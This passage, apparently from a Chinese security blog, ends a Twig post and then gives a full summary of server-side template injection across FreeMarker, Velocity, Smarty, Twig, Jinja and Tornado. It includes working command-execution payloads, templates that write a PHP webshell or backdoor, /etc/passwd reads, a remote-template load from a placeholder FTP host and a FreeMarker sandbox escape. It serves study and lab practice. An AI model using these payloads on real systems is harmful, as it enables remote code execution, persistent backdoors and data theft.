<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>如果在模板中使用extends,它必须是模板中的第一个标签</li>
<li>如果在多个模板中有重复的内容,这可能意味着你需要为该内容在父模板中定义一个block</li>
<li>某些情况下，更好的解决方案可能是把这些内容放到一个新模板中，然后在该模板中include它。</li>
<li>如果你需要从父模板中获取一个block的内容，可以使用函数。如果你只是想在父级块上添加新内容，而不是完全覆盖它</li>
<li>记住添加end符号</li>
</ul>
<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p><strong>判断变量是否定义(存在)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is defined %&#125;</span><br><span class="line">&#123;%  a.name  %&#125;</span><br><span class="line">&#123;%  endif %&#125;</span><br></pre></td></tr></table></figure>



<p><strong>判断变量是否为空</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is null %&#125;</span><br><span class="line">&#123;# do something #&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>



<p><strong>多条件判断语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a %&#125;</span><br><span class="line">    &#123;&#123; a.name &#125;&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">        &lt;h1&gt;xxxxxxx&lt;/h1&gt;</span><br><span class="line">   &#123;% endid %&#125;</span><br></pre></td></tr></table></figure>



<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for a in list %&#125;</span><br><span class="line">           &lt;li&gt;&#123;&#123;a.name&#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<p>按数组的key，value遍历，key&#x3D;index，value&#x3D;item</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for index, item in list %&#125;</span><br><span class="line">    &#123;&#123; index &#125;&#125;:&#123;&#123; item.id &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<p>按数组的key值遍历</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for key in list|keys %&#125;</span><br><span class="line">&#123;&#123; key &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><p>twig存在1.x，2.x，3.x的多个版本，不同版本的payload也有所不同。对于Twig来说，其变量_self暴露了Twig内部的许多API。</p>
<h3 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h3><p><strong>getFilter函数中存在危险函数call_user_func</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getFilter(name)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    foreach (this-&gt;filterCallbacks as callback) &#123;</span><br><span class="line">    if (false !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">      return filter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback(callable)</span><br><span class="line">&#123;</span><br><span class="line">  this-&gt;filterCallbacks[] =callable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Twig-2-x-amp-amp-3-x"><a href="#Twig-2-x-amp-amp-3-x" class="headerlink" title="Twig 2.x&amp;&amp;3.x"></a>Twig 2.x&amp;&amp;3.x</h3><p>测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once __DIR__.&#x27;/vendor/autoload.php&#x27;;</span><br><span class="line"></span><br><span class="line">loader = new \Twig\Loader\ArrayLoader();twig = new \Twig\Environment(loader);template = twig-&gt;createTemplate(&quot;Hello &#123;_GET[&#x27;name&#x27;]&#125;!&quot;);</span><br><span class="line"></span><br><span class="line">echo $template-&gt;render();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>命令执行成功，计算器打开</p>
<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217143043214.png" class title="image-20220217143043214">



<p><strong>使用map过滤器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用sort过滤器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用filter过滤器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用reduce过滤器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;calc&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>靶场地址:<a href="https://gosecure.github.io/template-injection-workshop/#0">http://template-injection.gosec.co:8012/.</a></p>
<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145127665.png" class title="image-20220217145127665">



<p>在这个表单中，您可以提交一个简单的表达式来确认模板是否用于显示值。下面的表达式将进行减法运算。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1338-1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>上面减法运算的结果，应该显示为1337</p>
<p>下面输入payload执行id命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>执行结果应该是:</p>
<img src="/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145353259.png" class title="image-20220217145353259">























<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/">twig模板注入payload ~ M1saka’s blog</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODcyNjEzNQ==&mid=2247518980&idx=4&sn=2fa791299de826677ad77e28c9e053ee&chksm=9bd3269caca4af8a9659666c8fc5a272f6f0de5927dbe305e25dacc104cc02b2154dfebf4ac9&scene=21#wechat_redirect">详解模板注入漏洞（上） (qq.com)</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>模板注入</category>
        <category>注入漏洞</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -模板注入</tag>
      </tags>
  </entry>
  <entry>
    <title>模板注入漏洞汇总</title>
    <url>/2022/02/11/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="模板注入漏洞汇总"><a href="#模板注入漏洞汇总" class="headerlink" title="模板注入漏洞汇总"></a>模板注入漏洞汇总</h1><hr>
<p>之前在项目中碰到的FreeMark模板注入，才开始注意到模板注入漏洞，这里总结下模板注入漏洞汇总集合。</p>
<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在MVC的设计模式下，一般从 Model 层中读取数据，然后将数据传到 View 层渲染（渲染成 HTML 文件），而 View 层一般都会用到模板引擎。</p>
<p>模板引擎包含了各种参数，并能够由模板处理系统通过识别某些特定语法来替换这些参数的文档，用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)。</p>
<p>模板专注于如何展现数据，而在模板之外可以专注于要展示什么数据。模板引擎可以让网站程序实现界面与数据分离，业务代码与逻辑代码分离，这样提升了开发效率，良好的设计也使得代码重用变得更加容易。</p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>模板引擎分为服务端和客户端：</p>
<p>1） <strong>客户端模板引擎</strong>：主要结合js实现html，一种是常规字符串模板引擎，包括doT.js、dust.js、mustache.js；</p>
<p>另一种是Dom模板引擎，包括vue.js、Angular.js、React.js等。</p>
<p>2） <strong>服务端模板引擎</strong>：由各服务端语言生成html返回客户端，主要包括： </p>
<p><strong>PHP</strong>：Smarty、Twig；</p>
<p><strong>Java</strong>：Freemarker、Velocity；</p>
<p><strong>Python</strong>：Jinja2、Tornado、Marko；</p>
<p><strong>Ruby</strong>：Slim、ERB；</p>
<p><strong>NodeJS</strong>：Jade等</p>
<h3 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h3><p><strong>后端模板引擎</strong></p>
<p>以JSP举例说明:</p>
<img src="/2022/02/11/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220211112733437.png" class title="image-20220211112733437">



<p>看到上面的JSP代码，&lt;%%&gt;里面的为Java代码，为模板内容，而<div>标签里面的则为页面内容。当JSP代码在服务端被运行成Servlet Class后，<div>标签会被添加引号成为字符串，输出字符串内容在服务端运行。</div></div></p>
<p><strong>前端模板引擎</strong></p>
<img src="/2022/02/11/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220211113850606.png" class title="image-20220211113850606">

<p>前端模板引擎依赖客户端，在浏览器渲染页面而不依赖服务端。</p>
<h2 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>任何一项新技术的引入同时也会带来新的攻击方式。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎本身会提供沙箱机制，但攻击者依然有许多手段绕过它。</p>
<p>看一个销售软件的例子，业务场景中要求发送大量的邮件给客户，并在每封邮件前插入问候语：</p>
<img src="/2022/02/11/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220211115030363.png" class title="image-20220211115030363">

<p>这段代码的功能是，通过Twig模板引擎可以把输入转换成特定的HTML文件或者email格式进行相应输出。</p>
<p>很明显我们会发现代码存在xss，但问题不止如此，如果我们输入custom_email&#x3D;49，$output结果为49。</p>
<h3 id="漏洞检测步骤"><a href="#漏洞检测步骤" class="headerlink" title="漏洞检测步骤"></a>漏洞检测步骤</h3><p>客户端的模板注入（CSTI）只能XSS，而服务端模板注入（SSTI）则可能造成XSS、LFI和任意代码执行。</p>
<p>漏洞检测步骤分为:探测、判断、利用(读取、探索、攻击)</p>
<h4 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h4><p>1、文本类型</p>
<p>大多数的模板都支持文本的输入和输出：</p>
<p>如：freemarker&#x3D;Hello ${username}，smarty&#x3D;Hello {user.name}</p>
<p>探测方法有两种：</p>
<p>   1）XSS语句弹框测试；</p>
<p>   2）使用模板语法：</p>
<p>如reemarker&#x3D;Hello${7*7}，输出为Hello 49</p>
<p>2、代码类型</p>
<p>用户输入也可以放在模板语句中，通常作为变量名称，</p>
<p>如：personal_greeting&#x3D;username</p>
<p>这种情况下，XSS的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞，</p>
<p>如：personal_greeting&#x3D;username<tag></tag></p>
<h4 id="判断漏洞"><a href="#判断漏洞" class="headerlink" title="判断漏洞"></a>判断漏洞</h4><p>当检测存在模板漏洞后，我们需要判断具体的模板引擎，比如使用不同的字符进行判断通过返回的错误提示来判断目标模板类型。</p>
<img src="/2022/02/11/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220211142308913.png" class title="image-20220211142308913">

<p>根据不同模板引擎的特性，通过输入上述payload可以快速判断出模板引擎。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>构造payload还是要根据各个模板特性来进行构造:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Template使用手册，一些基本的语法</span><br><span class="line"></span><br><span class="line">2.内建方法、函数、变量、过滤器</span><br><span class="line"></span><br><span class="line">3.插件、扩展及沙箱机制</span><br></pre></td></tr></table></figure>



<h3 id="模板分类"><a href="#模板分类" class="headerlink" title="模板分类"></a>模板分类</h3><p>下面针对多个模板的payload进行总结。</p>
<h4 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h4><p>FreeMaker 是 Java 下最受欢迎的模板引擎，在查看文档时我们发现有两个已发布的可接受用户输入并执行命令的类实现TemplateModel:</p>
<p><strong>&lt;#assigntest&#x3D;”freemarker.template.utility.Execute”?new()&gt;</strong></p>
<p><strong>&lt;#assignob&#x3D;”freemarker.template.utility.ObjectConstructor”?new()&gt;</strong></p>
<p>**&lt;#assign value&#x3D;”freemarker.template.utility.JythonRuntime”?new()&gt;**可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p>
<p><strong>payloads:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;/@value&gt;</span><br></pre></td></tr></table></figure>



<h4 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h4><p>  Velocity是另一种流行的Java模板语言，同样发现了两个可以利用的方法和属性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ class.inspect（类/对象/串） 返回一个检查指定类或对象的新ClassTool实例</span><br><span class="line"></span><br><span class="line">$ class.type  返回正在检查的实际类</span><br></pre></td></tr></table></figure>

<p>可以使用$ class.type 链接$ class.inspect以获取对任意对象的引用。然后使用Runtime.exec（）在目标系统上执行任意shell命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$class.inspect(<span class="string">&quot;java.lang.Runtime&quot;</span>).type.getRuntime().exec(<span class="string">&quot;bad-stuff-here&quot;</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#set($x=&#x27;&#x27;)##</span><br><span class="line"></span><br><span class="line">#set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))##</span><br><span class="line"></span><br><span class="line">#set($chr=$x.class.forName(&#x27;java.lang.Character&#x27;))##</span><br><span class="line"></span><br><span class="line">#set($str=$x.class.forName(&#x27;java.lang.String&#x27;))##</span><br><span class="line"></span><br><span class="line">#set($ex=$rt.getRuntime().exec(&#x27;ls&#x27;))##</span><br><span class="line"></span><br><span class="line">$ex.waitFor()</span><br><span class="line"></span><br><span class="line">#set($out=$ex.getInputStream())##</span><br><span class="line"></span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>



<h4 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h4><p> Smarty 是一款 PHP 的模板语言。它使用安全模式来执行不信任的模板，只运行 PHP 白名单里的函数，因此我们不能直接调用 system()。而文档表示可以通过 $smarty 来获取环境变量，我们又发现了 也可以使用getStreamVariable进行读取和写任意文件。</p>
<p>1）任意读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;ile:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>2）文件创建后门</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&quot;cmd&quot;]);?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h4><p>Twig可能是PHP最流行的模板库，它是由Synfony（一个非常流行的PHP框架）的创建者开发的。</p>
<p>Twig语法不仅简单，而且非常紧凑。下面是几个基本的变量绑定的例子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello &#123;&#123; var &#125;&#125;</span><br><span class="line"></span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure>



<p> Swig 和 Smarty 类似，不过我们不能用它调用静态方法。但它提供了 _self，提供了指向 Twig_Environment 的env 属性。Twig_Environment 其中的 setCache 方法则能改变 Twig 加载 PHP 文件的路径。这样就可以通过改变路径实现 RFI：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp://xxx.xxx.xxx:xxxx&quot;)&#125;&#125;&#123;&#123;_self.env.loadtemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>在 getFilter 里有危险函数 call_user_func。通过传递传递参数到该函数中，可以调用任意 PHP 函数，注册 exec 为 filter 的回调函数并调用造成命令执行。在下面的有效载荷中，命令id被执行后，将返回当前用户的id（Linux）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Jade"><a href="#Jade" class="headerlink" title="Jade"></a>Jade</h4><p>Jade 是一款 Node.js 模板引擎，可以在Node.js等框架中使用，它有比较简单的语法和编写方式：</p>
<img src="/2022/02/11/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20220216101423372.png" class title="image-20220216101423372">



<h4 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h4><p>Jinja是Python中一个流行的模板引擎，它与Django模板非常相似。不过，与Django模板相比，Jinsa可以轻松地在运行时动态使用。Django模板被设计为存储在静态文件中的动态视图。</p>
<p>下面是几个简单的表达式，用于演示Jinja的基本语法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//String</span><br><span class="line"></span><br><span class="line">&#123;&#123; message &#125;&#125;</span><br><span class="line"></span><br><span class="line">//Accessing an attribute</span><br><span class="line"></span><br><span class="line">&#123;&#123; foo.bar &#125;&#125;</span><br><span class="line"></span><br><span class="line">//Accessing an attribute (alternative)</span><br><span class="line"></span><br><span class="line">&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125;</span><br></pre></td></tr></table></figure>



<p>涉及到的所有类型如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;type &#x27;type&#x27;&gt;, &lt;type &#x27;weakref&#x27;&gt;, &lt;type &#x27;weakcallableproxy&#x27;&gt;, &lt;type &#x27;weakproxy&#x27;&gt;, &lt;type &#x27;int&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;bytearray&#x27;&gt;, &lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;NoneType&#x27;&gt;, &lt;type &#x27;NotImplementedType&#x27;&gt;, &lt;type &#x27;traceback&#x27;&gt;, &lt;type &#x27;super&#x27;&gt;, &lt;type &#x27;xrange&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;set&#x27;&gt;, &lt;type &#x27;slice&#x27;&gt;, &lt;type &#x27;staticmethod&#x27;&gt;, &lt;type &#x27;complex&#x27;&gt;, &lt;type &#x27;float&#x27;&gt;, &lt;type &#x27;buffer&#x27;&gt;, &lt;type &#x27;long&#x27;&gt;, &lt;type &#x27;frozenset&#x27;&gt;, &lt;type &#x27;property&#x27;&gt;, &lt;type &#x27;memoryview&#x27;&gt;, &lt;type &#x27;tuple&#x27;&gt;, &lt;type &#x27;enumerate&#x27;&gt;, &lt;type &#x27;reversed&#x27;&gt; [...]</span><br></pre></td></tr></table></figure>



<p><strong>payload</strong></p>
<p>对象子类列表中索引40对应的元素是subclasses()[40],我们可以使用该类型来读取任意文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;,&quot;r&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">//The previous extension is analog to</span><br><span class="line"></span><br><span class="line">file(&quot;/etc/passwd&quot;,&quot;r&quot;).read()</span><br></pre></td></tr></table></figure>

<p>仅适用于Python 2.7(python2和python3中可能子类索引有区别)</p>
<p><strong>OS模块</strong>(Python 2.7)</p>
<p>先执行一个命令并将命令输出临时存储在temp文件夹中，然后，再使用另一个Jinja表达式来读取命令输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].system(&#x27;id &gt; /tmp/cmd&#x27;) &#125;&#125;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&quot;/tmp/cmd&quot;,&quot;r&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h4><p>Tornado模板是Tornado（一款流行的Python Web框架）中的一个引擎。针对该模版的练习非常简单，这表明：有时候仅需阅读库文档就能找到强大的功能。</p>
<p>基本数据绑定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello &#123;&#123;userName&#125;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>pyload</strong></p>
<p>一个完整的payload，它用于导入os模块，并执行方法popen（即打开进程）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%import os%&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Freemaker沙箱逃逸"><a href="#Freemaker沙箱逃逸" class="headerlink" title="Freemaker沙箱逃逸"></a>Freemaker沙箱逃逸</h3><p>值得一提的是，Freemarker确实提供了一种方法来限制模板中的类引用，接下来的练习将按照文档中的描述实现一个ClassResolver。</p>
<p>但从从2.3.17版本开始后使用Configuration.setNewBuiltinClassResolver(TemplateClassResolver)或者new_builtin_class_resolver设置来限制这个内置寒水可以访问哪些类。</p>
<p><strong>Freemarker中的沙盒</strong></p>
<p>Freemarker具有过滤哪些类允许访问的功能。例如，需要实现TemplateClassResolver类的子类，这个类将决定模板中的类引用是否被允许。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;#list .data_model?keys as key&gt;</span><br><span class="line"></span><br><span class="line">&lt;li&gt;$&#123;key&#125;&lt;/li&gt;</span><br><span class="line"></span><br><span class="line">&lt;/#list&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<p>或者:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;.data_model.keySet()&#125;</span><br></pre></td></tr></table></figure>



<p><strong>查找对类加载器的引用</strong></p>
<p>Classloader类的实例有可能给我们提供远程代码执行（RCE）权限。例如，类加载器可以从外部提供方法加载类（Java字节码）。</p>
<p>以下是可能返回Classloader的常见位置列表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Class.getClassLoader()</span><br><span class="line"></span><br><span class="line">java.lang.Thread.getCurrentClassLoader()</span><br><span class="line"></span><br><span class="line">java.lang.ProtectionDomain.getClassLoader()</span><br><span class="line"></span><br><span class="line">javax.servlet.ServletContext.getClassLoader()</span><br><span class="line"></span><br><span class="line">org.osgi.framework.wiring.BundleWiring.getClassLoader()</span><br><span class="line"></span><br><span class="line">org.springframework.context.ApplicationContext.getClassLoader()</span><br><span class="line"></span><br><span class="line">这些API将转换为以下Freemarker语法形式。</span><br><span class="line"></span><br><span class="line">//java.lang.Object.getClass() -&gt; java.lang.Class.getClassLoader()</span><br><span class="line"></span><br><span class="line">$&#123;any_object.class.classLoader&#125;</span><br><span class="line"></span><br><span class="line">//javax.servlet.ServletRequest -&gt; javax.servlet.ServletContext.getClassLoader()</span><br><span class="line"></span><br><span class="line">$&#123;request.servletContext.classLoader</span><br></pre></td></tr></table></figure>



<p><strong>并非所有的类加载器都是相同的</strong></p>
<p>尽管不同的类加载器可能有一个公共的子类，但是，它们的实现却差别很大。不同的Web容器（托管Java应用的Web服务器）在运行时将使用不同的类加载器。因此，我们需要调整我们的payload来锁定正确的目标。</p>
<h4 id="读取文件-x2F-目录列表"><a href="#读取文件-x2F-目录列表" class="headerlink" title="读取文件&#x2F;目录列表"></a><strong>读取文件&#x2F;目录列表</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#assign uri = classLoader.getResource(&quot;META-INF&quot;).toURI() &gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign url = uri.resolve(&quot;file:///etc/passwd&quot;).toURL() &gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign bytes = url.openConnection().inputStream.readAllBytes() &gt;</span><br><span class="line"></span><br><span class="line">$&#123;bytes&#125;</span><br></pre></td></tr></table></figure>



<h4 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h4><p>Oleksandr Mirosh和Alvaro Mu?oz 在他们的文章中详细介绍了Web容器特有的各种链条。这些容器包括Tomcat、Jetty、GlassFish、WebLogic和WebSphere。如果您想寻找Freemarker之外的沙盒的逃逸技术，这些都是一个很好的灵感来源。</p>
<p>然而，如果您的目标是利用当前的模板引擎，则存在一个通用的payload（也是来自上面提及的同一篇文章），适用于Freemarker 2.3.29以及更低版本（2020年3月以及修复了该漏洞）。为此，您需要在数据模型中找到一个作为对象的变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#assign classloader=&lt;&lt;object&gt;&gt;.class.protectionDomain.classLoader&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign owc=classloader.loadClass(&quot;freemarker.template.ObjectWrapper&quot;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign dwf=owc.getField(&quot;DEFAULT_WRAPPER&quot;).get(null)&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign ec=classloader.loadClass(&quot;freemarker.template.utility.Execute&quot;)&gt;</span><br><span class="line"></span><br><span class="line">$&#123;dwf.newInstance(ec,null)(&quot;whoami&quot;)&#125;</span><br></pre></td></tr></table></figure>



<p>对数据模型中的所有变量进行暴力枚举</p>
